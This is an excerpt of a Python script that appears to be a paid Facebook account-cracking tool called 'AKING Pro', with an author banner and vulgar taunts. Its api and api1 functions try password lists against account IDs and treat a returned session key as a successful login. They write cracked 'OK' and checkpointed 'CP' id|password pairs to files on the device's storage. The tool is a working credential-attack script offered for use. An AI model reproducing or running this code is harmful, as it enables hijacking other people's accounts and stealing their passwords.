...
os.system('xdg-open https://www.facebook.com/MusfiqREmon111?mibextid=ZbWKwL/?ref=share/')
...
\033[1;37m██   ██  ██████  ██      ██  ██████  ██   ████     
----------------------------------------------
 Author    : Md Romun Ahmed ❤️(Md Romun Ahmed)❤️
 Github    : Md Romun Ahmed-Romun 
 Facebook  : Md Romun Ahmed
 Tool Name : Romun ❤️Md Romun Ahmed
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
 AKING Pro version 1.9.8
 For Haters: Abal chuda not allow,  all time hot 👿👹👺
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/MusfiqREmon111?mibextid=ZbWKwL/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [Romun -OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Romun -OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [Romun -CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Romun -CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [Romun -Md Romun Ahmed] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Romun -OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [Romun -OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/Romun -OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [Romun -OK] '+uid+' | '+pas+'\033[1;97m')
